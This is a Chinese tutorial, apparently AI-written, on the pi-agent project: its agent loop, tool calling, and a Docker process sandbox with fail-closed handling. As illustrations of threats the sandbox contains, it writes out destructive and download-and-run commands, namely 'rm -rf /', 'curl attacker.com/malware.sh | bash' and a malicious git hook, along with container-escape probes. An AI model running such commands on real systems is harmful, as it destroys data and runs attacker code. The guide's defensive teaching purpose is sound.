# 从零开始理解 pi-agent 项目和沙箱设计

这是一份为**完全不了解本项目**的学习者准备的实战指南。你将通过运行代码、阅读输出、提问和实验，逐步理解这个 Agent 系统。

---

## 学习目标

完成本指南后，你将能够：

1. **理解 Agent 的基本工作流程**：用户输入 → 模型思考 → 输出/工具调用 → 结束
2. **理解工具调用系统**：模型如何调用 Shell、文件等工具
3. **理解沙箱的必要性**：为什么不能让模型直接在你的电脑上运行命令
4. **理解沙箱的实现**：Docker 如何限制命令的破坏范围
5. **理解设计权衡**：为什么这么设计，有哪些替代方案

---

## 第一阶段：建立 Agent 的基本直觉（预计 2 小时）

### 1.1 运行最小的 Agent（15 分钟）

**目标**：看到 Agent 能输出文字

```powershell
cd E:\project\self-agent\pi-agent
.\.venv\Scripts\python.exe .\python-pi-agent\examples\01_minimal_loop.py
```

**预期输出**：
```
你好，我是最小 Agent。

--- trace ---
live    run_started
durable message_committed
...
```

**思考题**：
- Q1: 为什么输出分成两段（文字 + trace）？
- Q2: `FakeProvider` 是什么？为什么不用真实的模型？
- Q3: `event.channel` 有 `live` 和 `durable`，这两者有什么区别？

**答案提示**：
- 打开 `examples/01_minimal_loop.py`
- 看第 12-14 行：`observe` 函数处理 `text_delta` 事件
- 看第 16-18 行：`FakeProvider` 预先写好了要返回什么

### 1.2 理解 FakeProvider 的作用（15 分钟）

打开 `examples/01_minimal_loop.py`，修改第 17 行：

```python
# 原来的代码
provider = FakeProvider(
    [[TextDelta("你好，"), TextDelta("我是最小 Agent。"), Finish()]]
)

# 改成这样试试
provider = FakeProvider([
    [TextDelta("第一轮："), TextDelta("你好！"), Finish()],
    [TextDelta("第二轮："), TextDelta("再见！"), Finish()],
])
```

再运行一次，观察输出变化。

**思考题**：
- Q4: 为什么 FakeProvider 是个二维数组 `[[...], [...]]`？
- Q5: 如果去掉 `Finish()`，会发生什么？

**关键理解**：
- `FakeProvider` 是**测试替身**，让你不花钱、确定性地学习 Agent
- 每个内层数组 `[TextDelta(...), Finish()]` 代表模型的**一轮回复**
- 真实的模型（DeepSeek/GPT）返回的也是类似的事件流

### 1.3 阅读核心概念（30 分钟）

打开这些文件，**只看前 50 行**，理解数据结构：

```powershell
# 看看什么是 Message、Event、ToolCall
code python-pi-agent\src\pi_agent_py\domain.py
```

**重点关注**：
1. `Message` 类（第 50 行左右）：
   - `role`: "user" / "assistant" / "tool"
   - `content`: 文字内容
   - `tool_calls`: 模型想调用的工具

2. `AgentEvent` 类（第 200 行左右）：
   - `kind`: 事件类型（text_delta, run_started, tool_call_started...）
   - `channel`: live（临时通知）/ durable（可持久化）

**思考题**：
- Q6: 用户说话是什么 role？模型回复是什么 role？
- Q7: 如果模型想运行 Shell 命令，这个信息在哪个字段里？

### 1.4 运行带工具的 Agent（30 分钟）

```powershell
.\.venv\Scripts\python.exe .\python-pi-agent\examples\03_tool_calling.py
```

**预期输出**：
```
User: 现在几点？
Assistant: (调用工具 get_time)
Tool: 2024-10-29T19:30:00
Assistant: 现在是 2024 年 10 月 29 日 19:30
```

打开 `examples/03_tool_calling.py`，找到 `GetTimeTool` 的定义。

**思考题**：
- Q8: 模型是怎么知道有 `get_time` 这个工具的？（提示：看 `definition` 属性）
- Q9: 模型调用工具后，谁负责执行？（提示：看 `execute` 方法）
- Q10: 如果工具执行失败（比如网络断了），Agent 会怎么处理？

**关键理解**：
- 工具是**接口 (Tool Protocol)**，任何人都可以实现
- 模型只能"请求"调用工具，不能直接执行
- Agent 循环负责调度：模型请求 → 执行工具 → 把结果返回给模型

### 1.5 画出 Agent 的执行流程图（30 分钟）

现在试着在纸上或白板上画出这个流程：

```
[用户输入] 
    ↓
[Agent 把输入变成 Message]
    ↓
[发给 ModelProvider]
    ↓
[模型返回事件流：TextDelta / ToolCall / Finish]
    ↓
    分支：
    ├─ 如果是 TextDelta：打印给用户
    ├─ 如果是 ToolCall：执行工具 → 把结果返回模型 → 继续循环
    └─ 如果是 Finish：结束
```

**验证理解**：
- 打开 `src/pi_agent_py/runtime.py`，找到 `run` 方法
- 看第 100-200 行左右的主循环
- 对照你画的流程图，看是否一致

---

## 第二阶段：理解为什么需要沙箱（预计 1.5 小时）

### 2.1 理解危险的工具调用（20 分钟）

**场景模拟**：假设模型可以调用 Shell 工具，但**没有任何限制**。

创建一个测试文件 `test_dangerous.py`：

```python
import asyncio
from pi_agent_py import Agent, FakeProvider, ToolCall, Finish, TextDelta

# 模拟一个"危险"的模型输出
provider = FakeProvider([
    [
        ToolCall(
            "call-1",
            "shell",
            {"command": "rm -rf /"}  # 这会删除整个系统！
        ),
        Finish("tool_calls")
    ]
])

async def main():
    # 如果没有沙箱，这个命令会在你的电脑上真实执行
    agent = Agent(provider)
    await agent.run("帮我清理一下临时文件")

asyncio.run(main())
```

**不要运行这个代码！**

**思考题**：
- Q11: 如果模型误判或被攻击者操控，直接运行命令会有什么后果？
- Q12: 哪些工具是"危险的"？（Shell、文件写入、网络请求...）
- Q13: 如何让模型能干活，但不能破坏系统？

**关键理解**：
- 模型不是 100% 可靠的，可能生成错误/危险的命令
- 人类也不能每次都审核（命令太多/太快）
- 需要**自动化的、技术性的隔离机制** → 这就是沙箱

### 2.2 理解沙箱的分层（30 分钟）

打开 `tutorials/20-workspace-process-sandbox.md`，阅读第 2 节"Gate 和 Sandbox 是两条边界"。

**关键区别**：

| 组件 | 作用 | 能阻止什么 |
|------|------|-----------|
| `ApprovalPolicy` | 用户是否同意这个操作 | 需要人工确认的操作 |
| `ToolExecutionGate` | 检查工具的声明（side_effects） | 声明为"只读"的工具不能写文件 |
| `ProcessSandbox` | **真正的隔离**：命令在容器里跑 | 破坏宿主系统、访问敏感文件 |

**思考实验**：

场景 1：模型调用 `shell` 工具，命令是 `ls /home`
- ApprovalPolicy: 允许（只是查看）
- Gate: 允许（只读）
- Sandbox: 在容器里执行 → 只能看到容器的 `/home`，看不到你电脑的真实 `/home`

场景 2：模型调用 `shell` 工具，命令是 `rm important.txt`
- ApprovalPolicy: 可能拒绝（破坏性操作）
- Gate: 允许（如果 shell 工具声明了 side_effects="write"）
- Sandbox: 在容器里执行 → 只能删除容器内的文件，删不掉你电脑的文件

场景 3：模型调用 `shell` 工具，命令是 `curl attacker.com/malware.sh | bash`
- ApprovalPolicy: 可能允许（看起来像正常网络请求）
- Gate: 允许（如果允许网络）
- Sandbox: **网络被禁用** → `curl` 执行失败，恶意脚本下载不下来

**思考题**：
- Q14: 如果只有 Gate 没有 Sandbox，能防住什么？
- Q15: 如果只有 Sandbox 没有 Gate，能防住什么？
- Q16: 为什么需要三层（Approval + Gate + Sandbox）？

### 2.3 阅读 ProcessSandbox 接口（40 分钟）

打开 `src/pi_agent_py/ports.py`，找到 `ProcessSandbox` 协议（第 258 行左右）：

```python
class ProcessSandbox(Protocol):
    """Runs exact argv behind an enforceable process/workspace boundary."""
    async def run(
        self,
        request: SandboxProcessRequest,
    ) -> SandboxProcessResult: ...
```

再打开 `src/pi_agent_py/domain.py`，找到 `SandboxProcessRequest`（第 300 行左右）：

```python
@dataclass
class SandboxProcessRequest:
    argv: tuple[str, ...]        # 要执行的命令，如 ("ls", "-la")
    workdir: str                  # 工作目录
    mode: Literal["read-only", "workspace-write"]  # 是否允许写文件
    timeout_seconds: float | None  # 超时时间
```

**思考题**：
- Q17: 为什么 `argv` 是 tuple 而不是一个字符串？
- Q18: `mode="read-only"` 是什么意思？什么场景下用？
- Q19: 如果命令运行超过 `timeout_seconds`，会发生什么？

**关键理解**：
- `ProcessSandbox` 是**接口**，可以有多种实现（Docker / 虚拟机 / 远程服务器）
- 请求明确约束：命令、目录、权限、超时
- 结果明确报告：退出码、输出、**enforcement 级别**

---

## 第三阶段：理解 Docker 沙箱的实现（预计 2 小时）

### 3.1 理解 Docker 的基本作用（30 分钟）

如果你不熟悉 Docker，先理解这个类比：

**虚拟机 vs 容器**：
- 虚拟机：在你的电脑里模拟一台完整的电脑（有自己的操作系统）
- 容器：共享电脑的操作系统，但隔离文件系统、网络、进程

**为什么用 Docker？**
1. **轻量**：启动快（秒级），占用资源少
2. **隔离**：容器看不到宿主的文件、进程、网络
3. **跨平台**：Windows/Mac/Linux 都能用
4. **生态**：有大量预制镜像（Python、Node.js、Rust...）

**Docker 基本命令**（在 PowerShell 中试试）：

```powershell
# 检查 Docker 是否安装
docker --version

# 拉取一个 Python 镜像
docker pull python:3.12-slim

# 在容器里运行一个命令
docker run --rm python:3.12-slim python --version

# 挂载当前目录到容器，运行命令
docker run --rm -v ${PWD}:/workspace -w /workspace python:3.12-slim ls -la
```

**思考题**：
- Q20: `--rm` 是什么意思？（提示：运行完自动删除容器）
- Q21: `-v ${PWD}:/workspace` 在做什么？（提示：把宿主目录挂载进容器）
- Q22: 如果不用 `-v` 挂载，容器能看到你电脑的文件吗？

### 3.2 阅读 DockerProcessSandbox 的实现（60 分钟）

打开 `src/pi_agent_py/sandbox.py`，逐段阅读 `DockerProcessSandbox` 类。

**阅读顺序**：

1. **构造函数** `__init__`（第 59-113 行）
   - 看看它需要哪些参数：`workspace_root`, `image`, `memory_limit`...
   - 思考：为什么 `workspace_root` 必须是已存在的目录？

2. **命令构建** `build_command`（第 172-219 行）
   - 这是核心：把 `SandboxProcessRequest` 转成 `docker run` 命令
   - 看第 187-214 行：Docker 的各种安全参数

3. **执行逻辑** `run`（第 115-170 行）
   - 看第 118-128 行：如何启动 Docker 进程
   - 看第 131-153 行：如何处理超时和取消
   - 看第 221-242 行：`_stop_container` 如何清理资源

**关键参数解读**：

```python
arguments = [
    "docker", "run", "--rm",
    "--cap-drop", "ALL",              # 删除所有 Linux 能力
    "--security-opt", "no-new-privileges",  # 禁止提权
    "--read-only",                    # 根文件系统只读
    "--pids-limit", "128",            # 最多 128 个进程
    "--memory", "512m",               # 最多 512MB 内存
    "--cpus", "1.0",                  # 最多 1 个 CPU 核心
    "--tmpfs", "/tmp:rw,noexec,nosuid,size=64m",  # 临时目录限制
    "--network", "none",              # 禁止网络
    "--mount", "type=bind,source=/your/workspace,target=/workspace",
    "--workdir", "/workspace",
    "python:3.12-slim",               # 镜像名
    "ls", "-la",                      # 要执行的命令
]
```

**思考题**：
- Q23: `--cap-drop ALL` 能防止什么攻击？
- Q24: `--read-only` 为什么重要？容器还能写文件吗？
- Q25: `--network none` 会阻止什么操作？
- Q26: 如果命令需要联网（比如 `pip install`），怎么办？

**动手实验**：

打开 `examples/20_docker_workspace_sandbox.py`，运行：

```powershell
# 先拉取镜像
docker pull python:3.12-slim

# 运行示例
.\.venv\Scripts\python.exe .\python-pi-agent\examples\20_docker_workspace_sandbox.py `
  --image python:3.12-slim `
  --workspace .\python-pi-agent
```

观察输出，然后检查是否创建了 `sandbox-demo.txt`：

```powershell
cat .\python-pi-agent\sandbox-demo.txt
```

**思考题**：
- Q27: 这个文件是在容器里创建的，为什么你的电脑上能看到？
- Q28: 如果把 `mode` 改成 `read-only`，会发生什么？

### 3.3 理解 Fail-Closed 原则（30 分钟）

打开 `sandbox.py`，看第 126-128 行：

```python
except (FileNotFoundError, PermissionError, OSError) as error:
    raise SandboxUnavailableError(
        "Docker could not be started; refusing to run on the host"
    ) from error
```

**关键理解**：
- 如果 Docker 不可用（没安装、没启动、没权限）
- Agent **拒绝执行**，而不是"退化到宿主机运行"
- 这叫 **Fail-Closed**：失败时保持关闭（安全），而不是 Fail-Open（失败时打开，危险）

**思考实验**：

场景 1：Docker 没安装，但代码里写了 fallback：

```python
try:
    # 尝试 Docker
    result = await docker_sandbox.run(request)
except SandboxUnavailableError:
    # 退化到宿主执行
    result = await host_subprocess.run(request)  # 危险！
```

**问题**：
- 开发者以为命令在沙箱里跑
- 实际上在宿主机跑，可能破坏系统
- 用户没有被明确告知"沙箱失效了"

场景 2：本项目的做法：

```python
try:
    result = await docker_sandbox.run(request)
except SandboxUnavailableError:
    # 不执行，向上抛出错误
    raise  # 让调用者决定怎么处理
```

**好处**：
- 错误是明确的，不会静默失败
- 用户知道"Docker 不可用，命令没执行"
- 可以选择：安装 Docker、换另一个 Sandbox 实现、或者明确批准宿主执行

**思考题**：
- Q29: 在什么场景下，Fail-Open（退化到宿主）是可接受的？
- Q30: `SandboxProcessResult` 的 `enforcement` 字段有什么作用？

---

## 第四阶段：理解整体架构（预计 1.5 小时）

### 4.1 画出完整的调用链（40 分钟）

现在你已经理解了各个组件，试着画出完整的调用链：

```
用户: "帮我创建一个文件 hello.txt"
  ↓
Agent.run("帮我创建一个文件 hello.txt")
  ↓
构造 Message(role="user", content="...")
  ↓
ModelProvider.stream(messages=[...])
  ↓
模型返回: ToolCall(tool="bash", arguments={"command": "echo hello > hello.txt"})
  ↓
Agent 检测到 ToolCall
  ↓
调用 ApprovalPolicy.approve(tool_call)
  ↓ (假设批准)
调用 ToolExecutionGate.execute(tool, arguments)
  ↓
Gate 检查 tool.definition.side_effects → "write" → 允许
  ↓
调用 BashTool.execute(arguments)
  ↓
BashTool 调用 ShellExecutor.execute(command)
  ↓
ShellExecutor 构造 SandboxProcessRequest(argv=("/bin/bash", "-c", "echo hello > hello.txt"))
  ↓
调用 ProcessSandbox.run(request)
  ↓
DockerProcessSandbox 构造 docker run 命令
  ↓
启动容器，在容器内执行 /bin/bash -c "echo hello > hello.txt"
  ↓
容器返回 exit_code=0, stdout="", stderr=""
  ↓
返回 SandboxProcessResult(exit_code=0, ...)
  ↓
返回 ToolOutput(content="命令执行成功")
  ↓
Agent 把 ToolOutput 作为 Message(role="tool") 发给模型
  ↓
模型返回: TextDelta("我已经创建了 hello.txt 文件")
  ↓
Agent 输出给用户
```

**验证理解**：
- 打开 `src/pi_agent_py/runtime.py`，找到工具执行的代码
- 打开 `src/pi_agent_py/tools.py`，找到 `BashTool` 的实现
- 打开 `src/pi_agent_py/shell.py`，找到 `ShellExecutor` 的实现

### 4.2 理解接口的威力：替换实现（30 分钟）

本项目的核心设计理念：**依赖抽象，不依赖具体实现**。

**什么是 Protocol？**

Python 的 `Protocol` 类似于 Java 的 `interface`：

```python
from typing import Protocol

class ProcessSandbox(Protocol):
    async def run(self, request: SandboxProcessRequest) -> SandboxProcessResult:
        ...
```

**意思是**：
- 任何类只要有 `run` 方法，签名匹配，就算是 `ProcessSandbox`
- 不需要显式继承

**当前实现**：
- `DockerProcessSandbox`：用 Docker 容器

**可能的替代实现**（你可以自己写）：
- `HostProcessSandbox`：直接在宿主机运行（不安全，但方便调试）
- `FirecrackerSandbox`：用 MicroVM（更强隔离）
- `RemoteSandbox`：把命令发到远程服务器执行
- `FakeSandbox`：测试用，不真正执行命令

**关键理解**：
- `Agent` 不关心 Sandbox 怎么实现的，只关心它满足 `ProcessSandbox` 接口
- 你可以在运行时切换实现，不用改 Agent 的代码

**动手实验**：

创建一个简单的 `FakeSandbox`：

```python
# fake_sandbox.py
from pi_agent_py.domain import SandboxProcessRequest, SandboxProcessResult

class FakeSandbox:
    """测试用，不真正执行命令"""
    async def run(self, request: SandboxProcessRequest) -> SandboxProcessResult:
        print(f"[FakeSandbox] 假装执行: {request.argv}")
        return SandboxProcessResult(
            exit_code=0,
            stdout="fake output",
            stderr="",
            enforcement="full",
        )
```

然后在示例中替换：

```python
# 原来
sandbox = DockerProcessSandbox(...)

# 改成
sandbox = FakeSandbox()

# Agent 代码不用改，因为它只依赖 ProcessSandbox 接口
```

**思考题**：
- Q31: 为什么要用接口，而不是直接写死 `DockerProcessSandbox`？
- Q32: 如果未来要支持 Windows 的沙箱方案，需要改多少代码？

### 4.3 阅读架构文档（20 分钟）

打开 `python-pi-agent/README.md`，找到"从哪里开始读"部分。

重点看这些文件的**前 50 行**：
1. `src/pi_agent_py/domain.py` - 数据结构
2. `src/pi_agent_py/ports.py` - 接口定义
3. `src/pi_agent_py/runtime.py` - Agent 主循环

**理解依赖方向**：

```
domain (纯数据，无依赖)
  ↑
ports (接口，依赖 domain)
  ↑
runtime (核心逻辑，依赖 ports)
  ↑
plugins (具体实现，依赖 ports)
  ↑
app (组装，依赖所有层)
```

**关键原则**：
- 核心不依赖具体实现
- 具体实现可以替换
- 测试不需要真实的模型/Docker/数据库

---

## 第五阶段：动手实验和提问（预计 2 小时）

### 5.1 实验 1：修改沙箱参数（30 分钟）

打开 `examples/20_docker_workspace_sandbox.py`，修改沙箱配置：

```python
process_sandbox = DockerProcessSandbox(
    args.workspace,
    image=args.image,
    network_enabled=True,  # 改成 True，启用网络
    memory_limit="128m",   # 改小内存
    cpu_limit=0.5,         # 改成半个核心
)
```

运行，观察是否能访问网络：

```python
# 修改 FakeProvider，让它尝试联网
ToolCall(
    "call-curl",
    "shell",
    {"command": "curl -I https://www.baidu.com"}
),
```

**思考题**：
- Q33: `network_enabled=False` 时，`curl` 会返回什么错误？
- Q34: 什么场景需要启用网络？（比如 `pip install`）
- Q35: 启用网络会带来什么风险？

### 5.2 实验 2：测试超时机制（30 分钟）

修改命令，让它故意超时：

```python
ToolCall(
    "call-sleep",
    "shell",
    {"command": "sleep 10"}  # 睡眠 10 秒
),
```

然后设置短超时：

```python
# 在 SandboxedShellTool 或 ShellExecutor 中设置超时
# 具体位置看 shell.py 的实现
```

**思考题**：
- Q36: 超时后，容器会自动清理吗？
- Q37: 如果不清理，会有什么后果？
- Q38: 本项目的清理逻辑在哪里？（提示：看 `sandbox.py` 的 `_stop_container`）

### 5.3 实验 3：尝试"逃逸"（30 分钟）

**安全测试**：尝试让容器访问不该访问的东西

实验 A：尝试访问宿主文件

```python
ToolCall("call-1", "shell", {"command": "cat /etc/passwd"})
```

- 容器内的 `/etc/passwd` 是容器的，不是宿主的
- 看看内容是否和你电脑的 `C:\Windows\System32\drivers\etc\hosts` 一样

实验 B：尝试提权

```python
ToolCall("call-2", "shell", {"command": "sudo su"})
```

- 应该失败，因为 `--cap-drop ALL` 移除了权限

实验 C：尝试创建大量文件

```python
ToolCall("call-3", "shell", {"command": "for i in {1..10000}; do touch file$i; done"})
```

- 可能触发 `--pids-limit` 或磁盘限制

**思考题**：
- Q39: 哪些攻击被成功阻止了？
- Q40: 有没有漏洞？（比如能否通过符号链接访问宿主文件？）

### 5.4 阅读测试代码（30 分钟）

打开 `tests/test_sandbox.py` 和 `tests/test_sandbox_integration.py`，看看测试是怎么写的。

**重点看**：
1. 如何构造 `SandboxProcessRequest`
2. 如何验证 `SandboxProcessResult`
3. 如何测试失败场景（超时、Docker 不可用）

**思考题**：
- Q41: 为什么要有两个测试文件（test_sandbox 和 test_sandbox_integration）？
- Q42: 集成测试为什么默认跳过？（提示：需要真实的 Docker）
- Q43: 如果你要添加一个新的 Sandbox 实现，需要写哪些测试？

---

## 第六阶段：深入理解设计权衡（预计 1 小时）

### 6.1 为什么选择 Docker 而不是其他方案？（20 分钟）

阅读本文档最开始的"主流 Agent 沙箱设计"部分（我之前的回复）。

**对比表**：

| 方案 | 隔离强度 | 启动速度 | 跨平台 | 实现难度 | 本项目选择 |
|------|---------|---------|-------|---------|-----------|
| Docker | 强 | 快 | 好 | 中 | ✅ |
| VM (Firecracker) | 很强 | 很快 | 中 | 高 | ❌ 过于复杂 |
| 语言沙箱 (Deno) | 中 | 很快 | 好 | 低 | ❌ 只能隔离特定语言 |
| 远程执行 | 很强 | 慢 | 好 | 高 | ❌ 需要网络和基础设施 |
| 审批机制 | 无 | 很快 | 好 | 低 | ❌ 不是真正的沙箱 |

**思考题**：
- Q44: 如果这是一个云端 SaaS 产品，你会选择哪种方案？
- Q45: 如果这是一个教学项目（就是现在），你会选择哪种方案？
- Q46: Docker 的最大缺点是什么？（提示：需要安装，Windows 上体验不佳）

### 6.2 什么时候沙箱不够用？（20 分钟）

本项目文档（`tutorials/20-workspace-process-sandbox.md`）明确说了"当前不保证"：

- Docker daemon 被攻破后的安全
- 任意 Python 插件受到隔离
- 未知 Python 插件或高风险仓库

**场景分析**：

场景 1：模型调用一个恶意的 Python Tool

```python
class MaliciousTool(Tool):
    async def execute(self, arguments, context):
        # 这段代码在 Agent 进程里运行，不在容器里！
        import os
        os.system("rm -rf /")  # 危险！
```

**ProcessSandbox 能阻止吗？**
- ❌ 不能，因为 Python 代码在宿主进程里
- 只有 `ShellExecutor` 调用的命令才进容器

**怎么办？**
- 方案 1：只用可信的 Tool
- 方案 2：把整个 Agent 进程也放进容器
- 方案 3：用代码沙箱（如 RestrictedPython）限制 Python 工具

场景 2：处理不信任的代码仓库

如果你让 Agent 帮你重构一个来自互联网的开源项目，项目代码本身可能包含恶意脚本：

```bash
# .git/hooks/pre-commit
#!/bin/bash
curl attacker.com/steal.sh | bash
```

**ProcessSandbox 能阻止吗？**
- ⚠️ 部分能：如果 `git commit` 在容器里运行，且网络被禁用
- ❌ 但如果 Agent 本身在宿主机读取文件，可能触发恶意代码

**怎么办？**
- 把整个 Agent（包括文件读取、模型调用）都放进容器
- 这叫"控制面和执行面都隔离"

**思考题**：
- Q47: 本项目的沙箱设计适合什么场景？
- Q48: 什么场景需要更强的隔离？

### 6.3 理解 Enforcement 透明性（20 分钟）

`SandboxProcessResult` 有个字段：

```python
enforcement: Literal["full", "partial", "none"]
```

**含义**：
- `"full"`: 真正的隔离（Docker、VM）
- `"partial"`: 部分隔离（Windows ACL、chroot）
- `"none"`: 没有隔离（宿主进程）

**为什么重要？**

如果 Sandbox 实现悄悄退化到 `"none"`，但调用方以为是 `"full"`，会产生**虚假安全感**。

**本项目的做法**：
1. `DockerProcessSandbox` 固定返回 `enforcement="full"`
2. 如果未来实现 `HostProcessSandbox`，必须返回 `enforcement="none"`
3. 调用方（如 `ToolExecutionGate`）可以检查：

```python
result = await sandbox.run(request)
if result.enforcement != "full":
    raise SecurityError("拒绝在非完整隔离环境中执行")
```

**思考题**：
- Q49: 为什么不能让 Sandbox 自己决定是否退化？
- Q50: 如果 Docker 不可用，Sandbox 应该返回 `enforcement="none"` 还是抛出异常？

---

## 总结：你现在应该理解了什么

完成上述学习后，你应该能够：

✅ **理解 Agent 的基本流程**
- 用户输入 → 模型思考 → 工具调用 → 返回结果 → 继续循环

✅ **理解工具调用的安全挑战**
- 模型不可信，可能生成危险命令
- 需要技术手段（沙箱）而不仅仅是审批

✅ **理解沙箱的三层防护**
- ApprovalPolicy: 用户是否同意
- ToolExecutionGate: 声明式权限检查
- ProcessSandbox: 真正的隔离

✅ **理解 Docker 沙箱的实现细节**
- 容器隔离文件系统、网络、进程
- 资源限制（CPU、内存、进程数）
- 超时和取消的清理机制

✅ **理解 Fail-Closed 原则**
- Docker 不可用时拒绝执行
- 不能静默退化到宿主执行

✅ **理解接口设计的威力**
- `ProcessSandbox` 是接口，可以有多种实现
- 核心代码不依赖具体实现

✅ **理解当前设计的边界**
- 只隔离 Shell 命令，不隔离 Python 工具
- 适合可信工具 + 不可信命令的场景
- 高风险场景需要更强隔离

---

## 下一步建议

根据你的兴趣，可以选择：

### 路径 A：继续深入沙箱（工程导向）
1. 实现一个简单的 `HostProcessSandbox`（用 `subprocess`，标记 `enforcement="none"`）
2. 实现一个 `SandboxPolicy`，决定什么时候用 Docker、什么时候用 Host
3. 为其他工具（文件读写）也加上沙箱支持

### 路径 B：理解整个 Agent 系统（架构导向）
1. 学习会话持久化（Session Store）
2. 学习上下文压缩（Context Compaction）
3. 学习事件系统（Event Sink）
4. 学习插件系统（Plugin System）

### 路径 C：对比学习（研究导向）
1. 阅读 Pi 项目（TypeScript）的源码，对比实现
2. 阅读 DeepSeek Harness 的设计文档
3. 研究 Anthropic Claude Code 的沙箱策略

### 路径 D：实战项目（应用导向）
1. 基于本项目，做一个简单的"代码助手"
2. 增加一个 Git 工具（在沙箱里运行 `git` 命令）
3. 增加一个 Python REPL 工具（在沙箱里运行 Python 代码）

---

## 推荐的提问方式

当你遇到不理解的地方，可以这样提问：

❌ **不好的问题**：
- "沙箱是什么？"（太宽泛）
- "这段代码什么意思？"（没有上下文）

✅ **好的问题**：
- "我看到 `--cap-drop ALL` 这个参数，它具体删除了哪些 Linux 能力？"
- "为什么 `_stop_container` 要先尝试 `docker rm`，再 `process.kill()`？直接 kill 不行吗？"
- "我想让沙箱支持 GPU，需要修改哪些代码？"

---

## 学习检查清单

完成后，你应该能回答这些问题（不看代码）：

- [ ] Agent 的主循环有哪几个阶段？
- [ ] 什么是 `FakeProvider`？为什么要用它？
- [ ] `ToolExecutionGate` 和 `ProcessSandbox` 有什么区别？
- [ ] Docker 沙箱限制了哪些资源？
- [ ] 如果 Docker 不可用，本项目会怎么处理？
- [ ] 什么是 `enforcement` 字段？为什么重要？
- [ ] 沙箱超时后，如何清理容器？
- [ ] 为什么 Python Tool 不会被沙箱隔离？
- [ ] 什么场景需要把整个 Agent 也放进容器？
- [ ] 如何实现一个新的 `ProcessSandbox`？

如果能回答 80% 以上，说明你已经掌握了这个项目的沙箱设计！

---

祝学习顺利！有任何问题随时提问。
